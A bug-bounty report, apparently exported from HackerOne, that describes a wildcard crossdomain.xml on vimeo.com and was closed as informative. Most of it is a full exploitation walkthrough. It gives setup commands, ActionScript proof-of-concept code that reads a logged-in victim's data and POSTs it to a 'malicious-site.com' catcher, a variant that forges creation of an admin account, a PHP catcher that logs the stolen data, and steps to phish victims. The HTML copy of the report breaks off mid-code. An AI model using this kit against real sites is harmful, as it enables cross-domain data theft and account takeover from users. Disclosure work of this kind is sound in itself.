{"id":43070,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC80MzA3MA==","url":"https://hackerone.com/reports/43070","title":"Misconfigured crossdomain.xml - vimeo.com","state":"Closed","substate":"informative","readable_substate":"Informative","created_at":"2015-01-09T05:49:04.228Z","submitted_at":"2015-01-09T05:49:04.228Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"balag_py","url":"/balag_py","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/006/474/7b3bbf3c1bbc928e9b4154cc335bf1e42edbc0ac_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":56,"url":"https://hackerone.com/vimeo","handle":"vimeo","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/056/c3188aa0fc4a95fd486b5ee1f4b2d0b90da111d3_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Vimeo","twitter_handle":"vimeo","website":"https://vimeo.com","about":"Make life worth watching"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":true,"disclosed_at":"2015-02-09T17:32:04.619Z","bug_reporter_agreed_on_going_public_at":"2015-01-10T17:31:35.135Z","team_member_agreed_on_going_public_at":null,"comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\r\nAn overly permissive crossdomain.xml file on a domain that serves sensitive content is a major security risk. It exposes the domain hosting the improperly configured crossomain.xml file to information disclosure and request forgery. Attackers cannot only forge requests, they can read responses. This means the attacker can retrieve any information the authenticated user has access to, including account information, documents and files, and anti-CSRF tokens if they are used.\r\n\r\nURL : http://vimeo.com/crossdomain.xml\r\n=================================================================================\r\n\u003c?xml version=\"1.0\" encoding=\"UTF-8\"?\u003e\r\n\r\n\u003c!DOCTYPE cross-domain-policy SYSTEM \"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd\"\u003e\r\n\u003ccross-domain-policy\u003e\r\n    \u003csite-control permitted-cross-domain-policies=\"by-content-type\"/\u003e\r\n    \u003callow-access-from domain=\"*\" secure=\"false\"/\u003e\r\n    \u003callow-http-request-headers-from domain=\"*\" headers=\"*\"/\u003e\r\n\u003c/cross-domain-policy\u003e\r\n=================================================================================\r\n\r\nThe Vulnerability\r\n==============\r\nAs a general rule, if the following three conditions are met, there is problem:\r\n1. A crossdomain.xml file is hosted at the root of the host, for example: www.secret-site.com/crossdomain.xml.\r\n2. The crossdomain.xml is overly permissive.\r\n3. There is either sensitive information on www.secret-site.com or there are sensitive actions that can be performed on www.secret-site.com.\r\n\r\nIf #1 and #2 are met, but www.secret-site.com does not contain any sensitive information, or does not include the ability to perform any sensitive actions, there is no risk to having a wide open crossdomain.xml file. There is no point in making a victim make a request to a page for you if the information is all public and you can see everything anyway.\r\n\r\nHowever, if there are sensitive actions that can be performed or information that can be stolen, and www.secret-site.com has an overly permissive crossdomain.xml file, the application at www.secret-site.com is essentially opening the door to any malicious SWF loaded from anywhere on the web. For example, a SWF loaded from www.malicious-site.com is now able to override/bypass Same Origin Policy and gain access to everything that the authorized user of www.secret-site.com has access to. To say this in a different way, the overly permissive crossdomain.xml file allows Flash to do things that even JavaScript is not allowed to do, mainly accessing cross domain resources.\r\n\r\nNote: The most permissive configuration option is the following line: \u003callow-access-from domain=\"*\"\u003e. That is not the only overly permissive setting. Check out the reference papers listed above to find more.\r\n\r\nNote: API sites that require a pre-shared key are an exception to the conditions listed above.  In this case, even when all three conditions are met, if www.secret-site.com requires an API key or something similar to access the content, there is no risk. The attacker has no way of knowing the pre-shared secret API key, and therefore they can not forge a request with all of the required information to exploit the permissive crossdomain.xml.\r\n\r\nNote: In my examples, I use www as the hostname (www.secret-site.com).  The security implications of the crossdomain.xml are specific to the fully qualified domain name, including hostname and/or subdomain if they are present.  For example, if the https://www.secret-site.com/crossdomain.xml contains \u003callow-access-from domain=\"*\"\u003e, but all of the sensitive transactions happen on https://secure.secret-site.com, there is no risk.  Of course, if https://secure.secret-site.com/crossdomain.xml exists and it also has an overly permissive policy, then we are back in business.  \r\n\r\nExploitation\r\n==========\r\nAnd now the fun part. For the demo, I’m using Kali Linux. If you want to take advantage of the vulnerability described above, you need to modify and compile a SWF and host it on a web server.  The steps below show you how to do that, from start to finish. \r\n\r\n1) Install Adobe Flex:\r\n===================================================\r\napt-get install openjdk-6-jdk\r\n mkdir /opt/flex \r\n cd /opt/flex/ \r\n wget http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip\r\n unzip flex_sdk_4.6.zip \r\n chmod -R a+rx /opt/flex/\r\n echo 'export PATH=/opt/flex/bin:$PATH' \u003e\u003e ~/.bashrc\r\n chmod 755 bin/mxmlc\r\n===================================================\r\n\r\n2) Download Gursev’s exploit code (the .as and the .html files) from GitHub or copy/paste from his blog. In either case, you want to save the HTML into the web root (/var/www/crossdomain/xdx.html), and the AS file in a working folder outside of your web root (~/crossdomain/XDomainXploit.as) \r\n==================================================\r\nmkdir /var/www/crossdomain\r\n mkdir ~/crossdomain\r\n cd ~\r\n git clone https://github.com/gursev/flash-xdomain-xploit.git\r\n cp flash-xdomain-xploit/xdx.html /var/www/crossdomain/\r\n cp flash-xdomain-xploit/XDomainXploit.as ~/crossdomain/\r\n vi ~/crossdomain/XDomainXploit.as\r\n=====================================================\r\n\r\nIf for some reason you don't have the git client or the git command in the previous box doesn't work, you can use wget:\r\n=====================================================\r\ncd /var/www/crossdomain\r\n wget https://raw.github.com/gursev/flash-xdomain-xploit/master/xdx.html  \r\n cd ~/crossdomain\r\n wget https://raw.github.com/gursev/flash-xdomain-xploit/master/XDomainXploit.as\r\n vi ~/crossdomain/XDomainXploit.as\r\n======================================================\r\n\r\n3) Modify the ActionScript file to fit your needs. To make a basic GET request, Gursev's comments are self explanatory. You just replace the victim URL and the attacker URL.  My changes are highlighted in yellow.\r\n======================================================\r\n// POC Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)\r\n// XDomainXploit.as\r\n\r\npackage {\r\n import flash.display.Sprite;\r\n import flash.events.*;\r\n import flash.net.URLRequestMethod;\r\n import flash.net.URLRequest;\r\n import flash.net.URLLoader;\r\n\r\n public class XDomainXploit extends Sprite {\r\n  public function XDomainXploit() {\r\n   // Target URL from where the data is to be retrieved\r\n   var readFrom:String = \"http://www.secret-site.com/account/info\";\r\n   var readRequest:URLRequest = new URLRequest(readFrom);\r\n   var getLoader:URLLoader = new URLLoader();\r\n   getLoader.addEventListener(Event.COMPLETE, eventHandler);\r\n   try {\r\n    getLoader.load(readRequest);\r\n   } catch (error:Error) {\r\n    trace(\"Error loading URL: \" + error);\r\n   }\r\n  }\r\n\r\n  private function eventHandler(event:Event):void {\r\n   // URL to which retrieved data is to be sent\r\n   var sendTo:String = \"http://malicious-site.com/catcher.php\"\r\n   var sendRequest:URLRequest = new URLRequest(sendTo);\r\n   sendRequest.method = URLRequestMethod.POST;\r\n   sendRequest.data = event.target.data;\r\n   var sendLoader:URLLoader = new URLLoader();\r\n   try {\r\n    sendLoader.load(sendRequest);\r\n   } catch (error:Error) {\r\n    trace(\"Error loading URL: \" + error);\r\n   }\r\n  }\r\n }\r\n}\r\n=======================================================\r\n\r\nIf you want to have the SWF make a POST request, of if you need to set a HTTP header, you can use my example below:\r\n=======================================================\r\n// POC Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)\r\n// POC Modified to send POSTs and append HTTP headers: Seth Art\r\n// XDomainXploit.as\r\n\r\npackage {\r\n import flash.display.Sprite;\r\n import flash.events.*;\r\n import flash.net.URLRequestMethod;\r\n import flash.net.URLRequest;\r\n import flash.net.URLLoader;\r\n import flash.net.URLRequestHeader;\r\n public class XDomainXploit3 extends Sprite {\r\n  public function XDomainXploit3() {\r\n   // Target URL from where the data is to be retrieved\r\n   var readFrom:String = \"https://www.secret-site.com/admin/add\";\r\n   var header:URLRequestHeader = new URLRequestHeader(\"Content-Type\", \"text/plain; charset=UTF-8\");\r\n   var readRequest:URLRequest = new URLRequest(readFrom);\r\n   readRequest.method = URLRequestMethod.POST\r\n   readRequest.data = \"{\\\"name\\\":\\\"CSRF-Admin\\\",\\\"Group\\\":\\\"admin\\\",\\\"password\\\":\\\"password\\\",\\\"confirmPassword\\\":\\\"password\\\"}\";\r\n   readRequest.requestHeaders.push(header);\r\n   var getLoader:URLLoader = new URLLoader();\r\n   getLoader.addEventListener(Event.COMPLETE, eventHandler);\r\n   try {\r\n    getLoader.load(readRequest);\r\n   } catch (error:Error) {\r\n    trace(\"Error loading URL: \" + error);\r\n   }\r\n  }\r\n\r\n  private function eventHandler(event:Event):void {\r\n   // URL to which retrieved data is to be sent\r\n   var sendTo:String = \"http://www.malicious-site.com/crossdomain/catcher.php\"\r\n   var sendRequest:URLRequest = new URLRequest(sendTo);\r\n   sendRequest.method = URLRequestMethod.POST;\r\n   sendRequest.data = event.target.data;\r\n   var sendLoader:URLLoader = new URLLoader();\r\n   try {\r\n    sendLoader.load(sendRequest);\r\n   } catch (error:Error) {\r\n    trace(\"Error loading URL: \" + error);\r\n   }\r\n  }\r\n }\r\n}\r\n========================================================\r\n\r\n4) Compile the ActionScript with xmmlc:\r\n========================================================\r\n /opt/flex/bin/mxmlc ~/crossdomain/XDomainXploit.as\r\n========================================================\r\n\r\n5) Move the compiled SWF somewhere inside your web root\r\n========================================================\r\nmv ~/crossdomain/XDomainXploit.swf /var/www/crossdomain\r\n========================================================\r\n\r\n6) Create and save the catcher file. This php file takes the entire data portion of the incoming HTTP message and writes it to a file in /tmp. You can get a lot fancier with this, such as creating a separate file per victim, or by parsing the file within php and only writing the relevant information to disk.\r\n=========================================================\r\nvi /var/www/catcher.php\r\n\r\n\u003c?php\r\n\r\n$data = file_get_contents(\"php://input\");\r\n$ret = file_put_contents('/tmp/thanks_for_sharing.txt', $data, FILE_APPEND | LOCK_EX);\r\nif($ret === false) {\r\n die('Error writing to file');\r\n}\r\nelse { \r\n echo \"$ret bytes written to file\";\r\n}\r\n?\u003e\r\n============================================================\r\n\r\n7) Install PHP if it is not already installed:\r\n============================================================\r\n apt-get install php5\r\n============================================================\r\n\r\n8) Set your web server to support SSL.\r\n============================================================\r\n*This step is optional, but if your flash object is communicating with a HTTPS site, and the secure=\"false\" attribute is not set, your flash object needs to have been loaded from a HTTPS site. \r\n\r\nThe two lines below show you how to make a self-signed cert(http://charles.lescampeurs.org/2012/01/14/ubuntu-11-10-setting-up-apache2-and-ssl-with-self-signed-certificate). For a more realistic POC, you would want to purchase a valid SSL certificate so your victim user does not get any SSL errors.\r\n=============================================================\r\n make-ssl-cert generate-default-snakeoil --force-overwrite\r\n a2enmod ssl\r\n a2ensite default-ssl\r\n=============================================================\r\n\r\n9) Start [or restart] your web server\r\n=============================================================\r\n /etc/init.d/apache2 restart\r\n=============================================================\r\n\r\n10) Phish your victim to your site, www.malicious-site.com/crossdomain/xdx.html\r\n\r\n11) Hope the victim is currently logged in to the www.secret-site.com\r\n\r\n12) Collect and analyze your stolen data:\r\n\r\n cat /tmp/thanks_for_sharing.txt\r\n\r\n=====================================================================================\r\n\r\n\r\nPls Read this following Articles for more Information : \r\n===========================================\r\nhttp://sethsec.blogspot.in/2014/07/crossdomain-bing.html\r\n\r\nhttp://gursevkalra.blogspot.in/2013/08/bypassing-same-origin-policy-with-flash.html\r\n\r\nhttp://sethsec.blogspot.in/2014/11/crossdomainxml-can-be-overly-permissive_18.html?view=sidebar\r\n\r\n\r\n\r\nRegards,\r\nBALAJI","vulnerability_information_html":"\u003cp\u003eAn overly permissive crossdomain.xml file on a domain that serves sensitive content is a major security risk. It exposes the domain hosting the improperly configured crossomain.xml file to information disclosure and request forgery. Attackers cannot only forge requests, they can read responses. This means the attacker can retrieve any information the authenticated user has access to, including account information, documents and files, and anti-CSRF tokens if they are used.\u003c/p\u003e\n\n\u003ch1 id=\"url-http-vimeo-com-crossdomain-xml\"\u003eURL : \u003ca title=\"http://vimeo.com/crossdomain.xml\" href=\"/redirect?url=http%3A%2F%2Fvimeo.com%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://vimeo.com/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\n\u003c/h1\u003e\n\n\u003cp\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot;?\u0026gt;\u003c/p\u003e\n\n\u003cp\u003e\u0026lt;!DOCTYPE cross-domain-policy SYSTEM \u0026quot;\u003ca title=\"http://www.adobe.com/xml/dtds/cross-domain-policy.dtd%22%3E\" href=\"/redirect?url=http%3A%2F%2Fwww.adobe.com%2Fxml%2Fdtds%2Fcross-domain-policy.dtd%2522%253E\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.adobe.com/xml/dtds/cross-domain-policy.dtd%22%3E\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n\u0026lt;cross-domain-policy\u0026gt;\u003cbr\u003e\n    \u0026lt;site-control permitted-cross-domain-policies=\u0026quot;by-content-type\u0026quot;/\u0026gt;\u003cbr\u003e\n    \u0026lt;allow-access-from domain=\u0026quot;*\u0026quot; secure=\u0026quot;false\u0026quot;/\u0026gt;\u003cbr\u003e\n    \u0026lt;allow-http-request-headers-from domain=\u0026quot;*\u0026quot; headers=\u0026quot;*\u0026quot;/\u0026gt;\u003c/p\u003e\n\n\u003ch1 id=\"cross-domain-policy\"\u003e\u0026lt;/cross-domain-policy\u0026gt;\u003c/h1\u003e\n\n\u003ch1 id=\"the-vulnerability\"\u003eThe Vulnerability\u003c/h1\u003e\n\n\u003cp\u003eAs a general rule, if the following three conditions are met, there is problem:\u003c/p\u003e\n\n\u003col\u003e\n\u003cli\u003eA crossdomain.xml file is hosted at the root of the host, for example: \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003cli\u003eThe crossdomain.xml is overly permissive.\u003c/li\u003e\n\u003cli\u003eThere is either sensitive information on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e or there are sensitive actions that can be performed on \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e.\u003c/li\u003e\n\u003c/ol\u003e\n\n\u003cp\u003eIf #1 and #2 are met, but \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e does not contain any sensitive information, or does not include the ability to perform any sensitive actions, there is no risk to having a wide open crossdomain.xml file. There is no point in making a victim make a request to a page for you if the information is all public and you can see everything anyway.\u003c/p\u003e\n\n\u003cp\u003eHowever, if there are sensitive actions that can be performed or information that can be stolen, and \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e has an overly permissive crossdomain.xml file, the application at \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is essentially opening the door to any malicious SWF loaded from anywhere on the web. For example, a SWF loaded from \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.malicious-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.malicious-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is now able to override/bypass Same Origin Policy and gain access to everything that the authorized user of \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e has access to. To say this in a different way, the overly permissive crossdomain.xml file allows Flash to do things that even JavaScript is not allowed to do, mainly accessing cross domain resources.\u003c/p\u003e\n\n\u003cp\u003eNote: The most permissive configuration option is the following line: \u0026lt;allow-access-from domain=\u0026quot;*\u0026quot;\u0026gt;. That is not the only overly permissive setting. Check out the reference papers listed above to find more.\u003c/p\u003e\n\n\u003cp\u003eNote: API sites that require a pre-shared key are an exception to the conditions listed above.  In this case, even when all three conditions are met, if \u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e requires an API key or something similar to access the content, there is no risk. The attacker has no way of knowing the pre-shared secret API key, and therefore they can not forge a request with all of the required information to exploit the permissive crossdomain.xml.\u003c/p\u003e\n\n\u003cp\u003eNote: In my examples, I use www as the hostname (\u003ca href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ewww.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e).  The security implications of the crossdomain.xml are specific to the fully qualified domain name, including hostname and/or subdomain if they are present.  For example, if the \u003ca title=\"https://www.secret-site.com/crossdomain.xml\" href=\"/redirect?url=https%3A%2F%2Fwww.secret-site.com%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.secret-site.com/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e contains \u0026lt;allow-access-from domain=\u0026quot;*\u0026quot;\u0026gt;, but all of the sensitive transactions happen on \u003ca title=\"https://secure.secret-site.com\" href=\"/redirect?url=https%3A%2F%2Fsecure.secret-site.com\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.secret-site.com\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e, there is no risk.  Of course, if \u003ca title=\"https://secure.secret-site.com/crossdomain.xml\" href=\"/redirect?url=https%3A%2F%2Fsecure.secret-site.com%2Fcrossdomain.xml\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://secure.secret-site.com/crossdomain.xml\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e exists and it also has an overly permissive policy, then we are back in business.  \u003c/p\u003e\n\n\u003ch1 id=\"exploitation\"\u003eExploitation\u003c/h1\u003e\n\n\u003cp\u003eAnd now the fun part. For the demo, I’m using Kali Linux. If you want to take advantage of the vulnerability described above, you need to modify and compile a SWF and host it on a web server.  The steps below show you how to do that, from start to finish. \u003c/p\u003e\n\n\u003ch1 id=\"1-install-adobe-flex\"\u003e1) Install Adobe Flex:\u003c/h1\u003e\n\n\u003cp\u003eapt-get install openjdk-6-jdk\u003cbr\u003e\n mkdir /opt/flex \u003cbr\u003e\n cd /opt/flex/ \u003cbr\u003e\n wget \u003ca title=\"http://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip\" href=\"/redirect?url=http%3A%2F%2Fdownload.macromedia.com%2Fpub%2Fflex%2Fsdk%2Fflex_sdk_4.6.zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://download.macromedia.com/pub/flex/sdk/flex_sdk_4.6.zip\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n unzip flex_sdk_4.6.zip \u003cbr\u003e\n chmod -R a+rx /opt/flex/\u003cbr\u003e\n echo \u0026#39;export PATH=/opt/flex/bin:$PATH\u0026#39; \u0026gt;\u0026gt; ~/.bashrc\u003c/p\u003e\n\n\u003ch1 id=\"chmod-755-bin-mxmlc\"\u003e chmod 755 bin/mxmlc\u003c/h1\u003e\n\n\u003ch1 id=\"2-download-gursev-s-exploit-code-the-as-and-the-html-files-from-github-or-copy-paste-from-his-blog-in-either-case-you-want-to-save-the-html-into-the-web-root-var-www-crossdomain-xdx-html-and-the-as-file-in-a-working-folder-outside-of-your-web-root-crossdomain-xdomainxploit-as\"\u003e2) Download Gursev’s exploit code (the .as and the .html files) from GitHub or copy/paste from his blog. In either case, you want to save the HTML into the web root (/var/www/crossdomain/xdx.html), and the AS file in a working folder outside of your web root (~/crossdomain/XDomainXploit.as) \u003c/h1\u003e\n\n\u003cp\u003emkdir /var/www/crossdomain\u003cbr\u003e\n mkdir ~/crossdomain\u003cbr\u003e\n cd ~\u003cbr\u003e\n git clone \u003ca title=\"https://github.com/gursev/flash-xdomain-xploit.git\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fgursev%2Fflash-xdomain-xploit.git\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/gursev/flash-xdomain-xploit.git\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\n cp flash-xdomain-xploit/xdx.html /var/www/crossdomain/\u003cbr\u003e\n cp flash-xdomain-xploit/XDomainXploit.as ~/crossdomain/\u003c/p\u003e\n\n\u003ch1 id=\"vi-crossdomain-xdomainxploit-as\"\u003e vi ~/crossdomain/XDomainXploit.as\u003c/h1\u003e\n\n\u003ch1 id=\"if-for-some-reason-you-don-t-have-the-git-client-or-the-git-command-in-the-previous-box-doesn-t-work-you-can-use-wget\"\u003eIf for some reason you don\u0026#39;t have the git client or the git command in the previous box doesn\u0026#39;t work, you can use wget:\u003c/h1\u003e\n\n\u003cp\u003ecd /var/www/crossdomain\u003cbr\u003e\n wget \u003ca title=\"https://raw.github.com/gursev/flash-xdomain-xploit/master/xdx.html\" href=\"/redirect?url=https%3A%2F%2Fraw.github.com%2Fgursev%2Fflash-xdomain-xploit%2Fmaster%2Fxdx.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.github.com/gursev/flash-xdomain-xploit/master/xdx.html\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\u003cbr\u003e\n cd ~/crossdomain\u003cbr\u003e\n wget \u003ca title=\"https://raw.github.com/gursev/flash-xdomain-xploit/master/XDomainXploit.as\" href=\"/redirect?url=https%3A%2F%2Fraw.github.com%2Fgursev%2Fflash-xdomain-xploit%2Fmaster%2FXDomainXploit.as\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://raw.github.com/gursev/flash-xdomain-xploit/master/XDomainXploit.as\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch1 id=\"vi-crossdomain-xdomainxploit-as\"\u003e vi ~/crossdomain/XDomainXploit.as\u003c/h1\u003e\n\n\u003ch1 id=\"3-modify-the-actionscript-file-to-fit-your-needs-to-make-a-basic-get-request-gursev-s-comments-are-self-explanatory-you-just-replace-the-victim-url-and-the-attacker-url-my-changes-are-highlighted-in-yellow\"\u003e3) Modify the ActionScript file to fit your needs. To make a basic GET request, Gursev\u0026#39;s comments are self explanatory. You just replace the victim URL and the attacker URL.  My changes are highlighted in yellow.\u003c/h1\u003e\n\n\u003cp\u003e// POC Author: Gursev Singh Kalra (\u003ca title=\"gursev.kalra@foundstone.com\" href=\"mailto:gursev.kalra@foundstone.com\" rel=\"nofollow noopener noreferrer\"\u003egursev.kalra@foundstone.com\u003c/a\u003e)\u003cbr\u003e\n// XDomainXploit.as\u003c/p\u003e\n\n\u003cp\u003epackage {\u003cbr\u003e\n import flash.display.Sprite;\u003cbr\u003e\n import flash.events.*;\u003cbr\u003e\n import flash.net.URLRequestMethod;\u003cbr\u003e\n import flash.net.URLRequest;\u003cbr\u003e\n import flash.net.URLLoader;\u003c/p\u003e\n\n\u003cp\u003epublic class XDomainXploit extends Sprite {\u003cbr\u003e\n  public function XDomainXploit() {\u003cbr\u003e\n   // Target URL from where the data is to be retrieved\u003cbr\u003e\n   var readFrom:String = \u0026quot;\u003ca title=\"http://www.secret-site.com/account/info\" href=\"/redirect?url=http%3A%2F%2Fwww.secret-site.com%2Faccount%2Finfo\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://www.secret-site.com/account/info\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;;\u003cbr\u003e\n   var readRequest:URLRequest = new URLRequest(readFrom);\u003cbr\u003e\n   var getLoader:URLLoader = new URLLoader();\u003cbr\u003e\n   getLoader.addEventListener(Event.COMPLETE, eventHandler);\u003cbr\u003e\n   try {\u003cbr\u003e\n    getLoader.load(readRequest);\u003cbr\u003e\n   } catch (error:Error) {\u003cbr\u003e\n    trace(\u0026quot;Error loading URL: \u0026quot; + error);\u003cbr\u003e\n   }\u003cbr\u003e\n  }\u003c/p\u003e\n\n\u003cp\u003eprivate function eventHandler(event:Event):void {\u003cbr\u003e\n   // URL to which retrieved data is to be sent\u003cbr\u003e\n   var sendTo:String = \u0026quot;\u003ca title=\"http://malicious-site.com/catcher.php\" href=\"/redirect?url=http%3A%2F%2Fmalicious-site.com%2Fcatcher.php\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://malicious-site.com/catcher.php\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;\u003cbr\u003e\n   var sendRequest:URLRequest = new URLRequest(sendTo);\u003cbr\u003e\n   sendRequest.method = URLRequestMethod.POST;\u003cbr\u003e\n   sendRequest.data = event.target.data;\u003cbr\u003e\n   var sendLoader:URLLoader = new URLLoader();\u003cbr\u003e\n   try {\u003cbr\u003e\n    sendLoader.load(sendRequest);\u003cbr\u003e\n   } catch (error:Error) {\u003cbr\u003e\n    trace(\u0026quot;Error loading URL: \u0026quot; + error);\u003cbr\u003e\n   }\u003cbr\u003e\n  }\u003cbr\u003e\n }\u003c/p\u003e\n\n\u003ch1 id=\"part-2b622\"\u003e}\u003c/h1\u003e\n\n\u003ch1 id=\"if-you-want-to-have-the-swf-make-a-post-request-of-if-you-need-to-set-a-http-header-you-can-use-my-example-below\"\u003eIf you want to have the SWF make a POST request, of if you need to set a HTTP header, you can use my example below:\u003c/h1\u003e\n\n\u003cp\u003e// POC Author: Gursev Singh Kalra (\u003ca title=\"gursev.kalra@foundstone.com\" href=\"mailto:gursev.kalra@foundstone.com\" rel=\"nofollow noopener noreferrer\"\u003egursev.kalra@foundstone.com\u003c/a\u003e)\u003cbr\u003e\n// POC Modified to send POSTs and append HTTP headers: Seth Art\u003cbr\u003e\n// XDomainXploit.as\u003c/p\u003e\n\n\u003cp\u003epackage {\u003cbr\u003e\n import flash.display.Sprite;\u003cbr\u003e\n import flash.events.*;\u003cbr\u003e\n import flash.net.URLRequestMethod;\u003cbr\u003e\n import flash.net.URLRequest;\u003cbr\u003e\n import flash.net.URLLoader;\u003cbr\u003e\n import flash.net.URLRequestHeader;\u003cbr\u003e\n public class XDomainXploit3 extends Sprite {\u003cbr\u003e\n  public function XDomainXploit3() {\u003cbr\u003e\n   // Target URL from where the data is to be retrieved\u003cbr\u003e\n   var readFrom:String = \u0026quot;\u003ca title=\"https://www.secret-site.com/admin/add\" href=\"/redirect?url=https%3A%2F%2Fwww.secret-site.com%2Fadmin%2Fadd\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://www.secret-site.com/admin/add\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u0026quot;;\u003cbr\u003e\n   var header:URLRequestHeader = new URLRequestHeader(\u0026quot;Content-Type\u0026quot;, \u0026quot;text/plain; charset=UTF-8\u0026quot;);\u003cbr\u003e\n   var readRequest:URLRequest = new URLRequest(readFrom);\u003cbr\u003e\n   